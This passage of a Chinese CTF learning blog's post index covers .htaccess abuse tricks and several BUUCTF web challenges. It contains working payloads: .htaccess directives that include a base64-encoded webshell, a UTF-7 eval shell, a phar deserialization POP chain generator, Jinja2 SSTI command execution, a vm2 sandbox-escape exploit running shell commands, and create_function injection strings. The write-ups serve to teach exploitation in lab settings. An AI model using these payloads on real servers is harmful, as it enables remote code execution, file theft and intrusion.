这个时候就利用了glob通配符的知识了，我们知道，上传的文件会被临时储存在/tmp/文件夹下，那么如何确定其他的字符呢？ *首先可以代表0个及以上的任意字符**？可以代表1个任意字符 所以我们的文件名就可以表示为/*/??????或者/???/??????（这里假定文件名为6位） 但是此时，符合此文件名可能不止一位，所以该如何更精准的定位呢？ 深入理解glob通配符glob支持用[^x]的方法来构造“这个位置不是字符x”并且支持利用[0-9]来表示一个范围。 筛选方法：1.???[^x]??筛选出第四个字符不是x的项2.???[@-[]??筛选出第四个字符时大写字母的项（这里利用了ascc码的一个范围） 参考:https://www.php.net/manual/zh/migration70.incompatible.php","link":"/2021/06/08/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"},{"title":"htaccess文件详解","text":"前言感觉以前学的确实是不够精，原来htaccess文件不止是可以将其他文件以php的方式解析 简介htaccess提供了针对目录改变配置的方法 可实现功能文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能 指令作用范围.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 一些代码整合让某些文件以php的方式解析AddType application/x-httpd-php .png将png解析为php &lt;FilesMatch &quot;1&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;包含1的文件均解析为php 在所有页面包含(require)某个文件auto_prepend_file与auto_append_file使用方法 php.ini中有两项 auto_prepend_file 在页面顶部加载文件 auto_append_file 在页面底部加载文件 使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。 思路拓展：我们看一下这个原理，他是文件包含的思想在某个页面加载文件，当我们想到文件包含的时候自然而然地就会想到php伪协议，这就是这个功能的厉害所在如果有一道题目，他过滤了php的所有标签，但是允许你上传htaccess，这个时候的思路就是，将含有马的文件base64加密上传，然后再htaccess添加配置：php伪协议解码打开当然显示的页面本身的代码也要是php语言 代码php_value auto_prepend_file xxx.phpphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot; 使作用范围内的php文件在文件头/尾自动include指定文件，支持php伪协议 php_value include_path &quot;xxx&quot; 如果当前目录无法写文件，也可以改变包含文件的路径，去包含别的路径的文件 用途：文件包含，可以配合AddType 利用报错信息写文件php_value error_reporting 32767php_value error_log /tmp/fl3g.php 开启报错的同时将报错信息写入文件 用途：利用报错写shell UTF-7编码绕过尖括号&lt;过滤php_value zend.multibyte 1 # 启用多字节编码的源文件解析php_value zend.script_encoding &quot;UTF-7&quot; 将代码的解析方式改成UTF-7 mb_convert_encoding('&lt;?php eval($_GET[\\'cmd\\']); ?&gt;',&quot;utf-7&quot;); payload样例： +ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs prce绕过正则匹配php_value pcre.backtrack_limit 0php_value pcre.jit 0 if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) 而不是if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) !== 0)，因此可以通过php_value 设置正则回朔次数来使正则匹配的结果返回为false而不是0或1，默认的回朔次数比较大，可以设成0，那么当超过此次数以后将返回false tricks.htaccess似乎可以像shell那样使用\\将两行内容解释为一行 绕过脏字符如果.htaccess文件中有不符合语法的内容，访问服务器会直接报500，如果题目中乱写.htaccess文件，我们可以尝试换行注释掉脏字符例如：题目中有file_put_contents($filename, $content . &quot;\\nJust one chance&quot;)，我们payload最后可以加上#\\，#负责注释，\\将注释符和脏字符连成一行，注释掉脏字符，最后的文件为 php_value include_path &quot;/tmp&quot;php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;# \\Just one chance 绕过WAF如果题目过滤了’file’，可以这么写.htaccess php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php eval($_GET[a]);?&gt;\\ .php. (2)绕过exif_imagetype()上传.htaccess #define width 20#define height 10 采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：#define test_width 16#define test_height 7 参考：https://www.cnblogs.com/20175211lyz/p/11741348.html ErrorDocument利用这个文档可以读文件 https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errordocument ErrorDocument 500 http://example.com/cgi-bin/server-error.cgiErrorDocument 404 /errors/bad_urls.phpErrorDocument 401 /subscription_info.htmlErrorDocument 403 &quot;Sorry, can't allow you access today&quot;ErrorDocument 403 Forbidden!ErrorDocument 403 /errors/forbidden.py?referrer=%{escape:%{HTTP_REFERER}} 意思是，当出现以上错误时，就会返回后面的内容，那就意味着可以直接读了 ErrorDocument 404 %{file:/etc/apache2/apache2.conf} https://www.cnblogs.com/ningmeng666/p/7644002.html ErrorLog ErrorLog 也能执行命令 customlog globallog forensiclog transferlog 都具有 pipe 形式 参考格式:https://www.docs4dev.com/docs/zh/apache/2.4/reference/logs.html#piped https://github.com/wireghoul/htshells","link":"/2021/06/11/htaccess%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"title":"PHP反序列化类的基础知识再学习","text":"前言总觉得自己的基础知识不是很扎实，导致在做题的过程速度很慢，也没有完整的整理过，所以这里把基础概念再整理一下 类有什么类可以有常量、属性（也就是变量）、方法（也就是函数） 什么是类类是面向对象的基本概念，就是对现实中某一种类的事物的抽象 比如手机可以抽象为一个类，具体属性有显示屏类型，显示屏帧率，处理器，内存规格，电池大小，快充功率，摄像头规格等。 可以有获取手机名称，打电话，玩游戏，看视频，聊天等操作方法。 class phone{//声明属性 $name='手机'; function getPhoneName{ return $this-&gt;name; }} 什么是对象对象是异类食物的一个具体事例：比如这部手机 对象通过new关键字实例化 $phone =new Phone();//实例化一个手机对象$phone-&gt;name ='iphone';//给手机名称赋值echo $phone-&gt;getPhoneName();//调用getPhoneName的方法 小结类是抽象的概念，对象是具体的实例，类使程序具有重用性，就是可以被其他类继承 什么是属性类的变量成员即为属性 伪变量$this$this 的含义是表示实例化后的具体对象 举个例子: class phone{ public $name; public function getName(){ echo $this-&gt;name; }}$user=new phone;$user-&gt;name='iphone';$user-&gt;getname();//echo iphone; 一点体会我们的class 是类，我们后面的$XXX=new xxx;是实例化一个对象，对象是这个XXX！我们实例化了这个对象，他就具有了类的相关性质，我们可以进行调用。","link":"/2021/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%86%8D%E5%AD%A6%E4%B9%A0/"},{"title":"buuctf19","text":"[SWPUCTF 2018]SimplePHP一开始就先看看源码之类的 发现flag在flag.php 然后查看文件这里有个?file=什么 感觉可以文件包含,成功拿到源码 &lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) { //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'; return false; } } } ?&gt; 用了白名单过滤，所以暂时没有什么好的绕过方法于是看看文件包含能不能继续走，发现一个class.php &lt;?phpclass C1e4r{ public $test; public $str; public function __construct($name) { #将str赋值为name $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; }}class Show{ public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; }}?&gt; 文件上传+序列化——&gt;phar反序列化，所以此时思路就来了接下来开始研究一下如何上传 这是怕我们做不出来 还特意给了提示吧，分析一下pop链如何构造最后哟个file_get_contents这应该是我们的最终利用点了，从后往前推，是value被查，所value的赋值来自get里面的params[$key]，那我们就需要让key的值来自get的赋值，所以我们需要使用到get这个魔术方法，使用条件为读取不可访问或不存在的属性时跳转，往前看 show的set里面有个key，想要跳转到set的条件是，对不可访问或不存在的属性进行复制，那么value又要从哪里来？所以这里好像行不通，我们换个思路，我们要使用get这个魔术方法，就要看看哪里能调用不可访问或不存在的属性进行跳转，这个时候就看到tostring里面的str[‘str’]-&gt;source，我们此时将str[‘str’]赋值为test类，那么就会调用不存在的属性source，就会跳转到test的get中了，那么tostring那里会被调用了，除了show里面的construct我们要用来对file赋值以外，就是cle4r里面的destruct了接下来正式构造一波: 感觉对于这里的思路很乱，于是尝试重新理顺一下思路： pop链的构造首先需要找到头和尾，头就是传入的地方，尾就是最终执行的地方 本题中的尾巴就是file_get_contents，头就是我们的phar 从尾部倒退，我们要执行file_get()就要执行get()，那么就需要执行__get，即调用不存在或不可访问的属性，那么我们在哪里可以调用不存在或不可访问的属性呢？ to_string中使用了str[‘str’]调用了source，而source是test中没有的属性，所以我们可以将str[‘str’]赋值为test 但是问题又来了，to_string 如何调用呢？那么就需要找到将类转化为字符串输出的地方 在__destruct中有个echo $this-&gt;test这里我们如果将test为show类，那么就会调用show类里面的to_string了 整体的思路如上 接下来就写一下具体的构造链条: &lt;?phpclass C1e4r{ public $test; public $str;}class Show{ public $source; public $str;}class Test{ public $file; public $params;}$a=new C1e4r();$b=new Show();$c=new Test();$a-&gt;str=$b;$b-&gt;str['str']=$c;$c-&gt;params['source']='/var/www/html/f1ag.php';echo serialize($a);$phar = new Phar(&quot;exp.phar&quot;); //.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); //固定的$phar-&gt;setMetadata($a); //触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(&quot;exp.gif&quot;, &quot;test&quot;); //随便写点什么生成个签名$phar-&gt;stopBuffering();?&gt; O:5:&quot;C1e4r&quot;:2:{s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:{s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:{s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:{s:6:&quot;source&quot;;s:22:&quot;/var/www/html/f1ag.php&quot;;}}}}} 以上即可构造成功，但是这题是phar 我们还需要加点内容 接下来就是改一下后缀诶gif之类的图像后缀，上传文件 然后使用phar:解析了 如上所示，在这里可以看到文件名，所以 file.php?file=phar://upload/67e9350f1ef6ad63c902075576c35210.jpg 小结：本题是常规的phar反序列化题目 [HarekazeCTF2019]encode_and_encode &lt;?phperror_reporting(0);if (isset($_GET['source'])) { show_source(__FILE__); exit();}function is_valid($str) { $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) { return false; } return true;}$body = file_get_contents('php://input');#使用php伪协议接受数据，意味着我们可以post内容$json = json_decode($body, true);#对于我们post的内容进行解码#检查是否有黑名单的内容if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) { $page = $json['page'];#解码出来以后需要有page标签 $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; }} else { $content = '&lt;p&gt;invalid request&lt;/p&gt;';}// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&amp;lt;censored&amp;gt;}', $content);echo json_encode(['content' =&gt; $content]); 看到题目 又看到过滤了那么多内容，第一时间想到的是会不会有什么字符串解析漏洞先分析一下源码吧:好了分析完毕，其实思路很简单，就是通过json的一些解析漏洞构造特殊编码形式绕过is_valid检查，而且很关键的是is_valid针对的是body的检查，而不是被解码后的json检查，然后再file_get_contents文件包含后再绕过一次，这里就很明显，肯定用php://filter base64加密就好了http://www.faqs.org/rfcs/rfc7159.html在这篇文章中，提到了一点：如果遇到 所以这里用\\u 也就是Unicode的编码形式进行绕过试试看：payload: {&quot;page&quot;:&quot;\\u0070\\u0068\\u0070\\u003a\\u002f\\u002f\\u0066\\u0069\\u006c\\u0074\\u0065\\u0072\\u002f\\u0063\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u002e\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u002f\\u0072\\u0065\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u003d\\u002f\\u0066\\u006c\\u0061\\u0067&quot;} 额 成功了，感觉这题可能难度不大=-= 找找资料就行了 [网鼎杯 2020 白虎组]PicDown 一开始看到url 感觉像是文件读取，于是就随便试了一下，发现可以下载文件，但是不知道怎么打开，于是抓包 发现直接就有flag了–应该是非预期解看了一下正规wp，果然~首先/proc/self/cmdline读取当前运行文件进程得到app.py，并读取获得源码 from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route('/')def index(): return render_template('search.html')@app.route('/page')def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template('search.html', res=value)@app.route('/no_one_know_the_manager')def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 分析一波： 可以看到有三个路由 关键是第三个有个os.system可以执行shell但是需要我们匹配密钥，但是在一开始就被删了，不过没关系，这个文件是用open打开的，会创建文件描述符。我们读这个文件描述符中的内容就好了： /proc/self/fd/3 /proc/[pid]/fd 是一个目录，包含进程打开文件的情况，所以我们打开self里面序号为3（3是fuzz出来的） PyqGcLrhUhzQcdZiXqYiW+rUDJNn85fC9pMN3VEje7Q= 获得密钥，接下来就是进行连接一开始尝试了一下 发现key不对，很纳闷，urlencode后就行了，发现有个+号被解析为空格了、、、有个小坑，后面的shell构造先留个坑，服务器买来好久没用了00忘记密码了，，，，","link":"/2021/06/18/buuctf19/"},{"title":"buuctf20","text":"之前的博客忘记保存了。。。。呜呜呜呜 [watevrCTF-2019]Cookie Storecookie伪造，session是很明显的base64编码，把钱更改一下，然后id更改一下就可以拿到flag了 [RootersCTF2019]I_&lt;3_Flask介绍一个工具:Arjun工具使用python进行安装简单介绍一下使用方法： python3 arjun -u http://25aa54c2-e825-4339-b4cf-b794f03a4221.node4.buuoj.cn/ -m get -c 150 -d 0.5 https://www.freebuf.com/sectool/200175.html https://www.freebuf.com/sectool/200175.html 扫出注入名为name，接下来直接构造注入语句进行注入 name={{%22%22.__class__.__base__.__subclasses__()[222]('cat /proc/self/cwd/flag.txt',shell=True,stdout=-1).communicate()[0].strip()}} 其中也有遇到一个难点，就是找不到flag，越是先使用了find -name “flag*”找了一下flag，发现是flag.txt，但依旧不知道路径，于是翻了一下linux重要目录，使用/proc/self/cwd/列出了当前运行进程工作目录： 但是还是没有完整路径，这里就猜想了一下，这个路径能不能直接访问呢？ 没想到居然是可以的所以就有了以上payload 小tips可以通过/proc/self/cwd/直接cat到当前工作进程的文件例如/proc/self/cwd/flag.txt 就可以直接cat到此flag而不需要去寻找flag的绝对路径 [BJDCTF2020]EzPHP &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); }if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!');if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);}if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; 真好，又忘记保存博客了。 绕过小结1.$_SERVER['QUERY_STRING']绕过$_SERVER[‘QUERY_STRING’]接受数据是不会进行解码的，所以我们直接将传入的内容进行url编码即可 2.preg_match绕过正则匹配使用%0Aj进行换行操作即可绕过 3.REQUEST值匹配绕过由于post的优先级高于get，所以我们只要传一个post值就可以，当然是要数字 4.file_get_contents绕过我们知道file_get_contents是从文本中读取内容，那么这里就需要使用php的伪协议了，使用data即可格式为data:text/plain;+文本 5.sha绕过使用数组进行绕过即可就传入数组就行 但是很奇怪 当我在绕过第三个的时候发现就出问题了，，在本地尝试也是可以绕过的，但是到了buu上面就是绕不过？看了一下wp 考点在于后面create_function的构建，于是就直接来学学吧 create_function的使用1.简介适用范围：PHP 4&gt; = 4.0.1，PHP 5，PHP 7 功能：根据传递的参数创建匿名函数，并为其返回唯一名称。 语法： create_function(string $args,string $code)string $args 声明的函数变量部分string $code 执行的方法代码部分 2.功能分析案例&lt;?php$newfunc = create_function('$a,$b', 'return &quot;ln($a) + ln($b) = &quot; . log($a * $b);');echo &quot;New anonymous function: $newfunc\\n&quot;;echo $newfunc(2, M_E) . &quot;\\n&quot;;?&gt; 3.执行原理分析create_funtion()会创建一个匿名函数（lambda样式）。此处创建了一个lambda_1的函数，在第一个echo中显示出名字，并在第二个echo语句中执行了此函数 create_function()函数会在内部执行eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string$code位置 function lambda_1($a, $b){ return $a+$b;} 4.本题利用详解本题利用点在这里: $code('', $arg); 第一个参数为空，第二个为可控参数，所以我们需要构造注入语句，看下$arg来自哪里。。逛了一圈，发现哪里都没有发现了extract() 函数 extract() 函数从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。 针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 该函数返回成功设置的变量数目。 所以我们就利用这个flag来改变arg的值首先，构造出来的语句要具有变成下面这样: function a{ return $a;}xxx;//} 翻译成我们的注入语句即为： &amp;flag[arg]=}a();//&amp;flag[code]=create_function 而这个a后面的函数我们还有待构建就是了。。接下的难点是1.无法使用system()等函数执行系统命令，过滤了flag等关键字，过滤了print等关键字但是,在这里还包含了 { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; 这里的这个思路就很奇妙了包含了这个文件，代表可以使用里面的变量，所以要想办法在不指定变量名称的情况下输出变量的值——get_defined_vars()函数用来输出所有的变量和值 所以使用的payload为： &amp;flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function 但是此时只能获取到假的flag，继续构造: &amp;flag[arg]=}require(base64_decode(MWZsYWcucGhw));var_dump(get_defined_vars());//&amp;flag[code]=create_function 由于环境受限没法复现完全，但是看了师傅们的文章感觉视野开拓了不少 非预期解1取反/异或绕过+伪协议读源码payload: require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));// 中间的取反结果为： php://filter/read=convert.base64-encode/resource=1flag.php https://www.gem-love.com/ctf/770.html#%E8%80%83%E7%82%B96%EF%BC%8Ccreatefunction()%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5 小结：这题很可惜，似乎是环境出了点问题所以没办法做到最后一步，但是也收获了很多，尤其是最后文件包含的思路，眼前一亮，以及非预期解让我懂得了其实字符过滤，异或取反操作往往会有不一般的收获，","link":"/2021/06/21/buuctf20/"},{"title":"python urllib库学习","text":"基础介绍原来这个和request这个库是同类型的库，它具有以下子模块，包括：1.urllib.request打开后读取url内容2.urllib.error包含由urllib.request抛出的异常类3.urllib.parse解析url4.urllib.robotparser解析robots.txt files","link":"/2021/07/10/python-urllib%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"title":"buuctf21","text":"[CISCN2019 华东南区]Double Secret猜出目录是secret，然后参数也是secret接下来输入参数发现每次参数的回显是不一样，像是有某种加密发现输入的字符比较多的时候就会报错了 if(secret==None): return 'Tell me your secret.I will encrypt it so others can\\'t see'rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;) #解密deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!'return a 感觉这是其中一个比较有用的信息，涉及了解密内容 注意关键点： a=render_template_string()函数说明可以渲染我们输入的参数，也就是说存在ssti注入 所以接下来的关键是利用rc4加密的密文，将我们的payload进行加密后输入，接下来就会自动进行解密，就会执行我们的payload了~ 网上找的加密脚本: import base64from urllib import parsedef rc4_main(key=&quot;init_key&quot;,message=&quot;init_message&quot;): s_box=rc4_init_sbox(key) crypt=str(rc4_excrypt(message,s_box)) return cryptdef rc4_init_sbox(key): s_box=list(range(256)) j=0 for i in range(256): j=(j+s_box[i]+ord(key[i%len(key)]))%256 s_box[i],s_box[j]=s_box[j],s_box[i] return s_boxdef rc4_excrypt(plain,box): res=[] i=j=0 for s in plain: i=(i+1)%256 j=(j+box[i])%256 box[i],box[j]=box[j],box[i] t=(box[i]+box[j])%256 k=box[t] res.append(chr(ord(s)^k)) cipher=&quot;&quot;.join(res) return(str(base64.b64encode(cipher.encode('utf-8')),'utf-8'))key=&quot;HereIsTreasure&quot;message=input(&quot;请输入明文:\\n&quot;)enc_base64=rc4_main(key,message)enc_init=str(base64.b64decode(enc_base64),'utf-8')enc_url=parse.quote(enc_init)print(&quot;rc4加密后的url编码:&quot;+enc_url) 用手打了一次，还是学到了些东西的然后输入 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;)}}{% endif %}{% endfor %} 即可查看到目录 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('cat flag.txt').read()&quot;)}}{% endif %}{% endfor %} [HFCTF2020]JustEscape下面有提示 让我们到run.php里面输出code于是—— 以为是ssti注入所以输了点内容，发现后面出了这玩意？error.stack 属性是一个字符串，描述代码中 Error 被实例化的位置输入Error().stack得到: Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) 可以发现是一个js的vm沙盒直接找原型利用链来打就行 最新的沙箱逃逸的poc。 https://github.com/patriksimek/vm2/issues/225 '(' + function(){ TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try{ Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; }catch(e){ return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); }}+')()';try{ console.log(new VM().run(untrusted));}catch(x){ console.log(x);} 但是因为有过滤，所以需要绕过，可以加上反引号进行绕过: /run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})() 还有一种方式是将关键字（比如prototyp）改为：${${prototyp}e} (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString(); } })() payload分析：刚学node.js的沙箱逃逸啥也编不出来，于是就用payload来分析一下 '(' + function(){ TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try{ Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; }catch(e){ return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); }}+')()';try{ console.log(new VM().run(untrusted));}catch(x){ console.log(x);} 参考: https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/https://github.com/patriksimek/vm2/issues/225 [NPUCTF2020]ezinclude查看源码，看到cookie 直接传pass 然后进去，抓包才能看到其他信息 看到文件包含就要想到伪协议！： php://filter/read=convert.base64-encode/resource=flflflflag.php &lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; 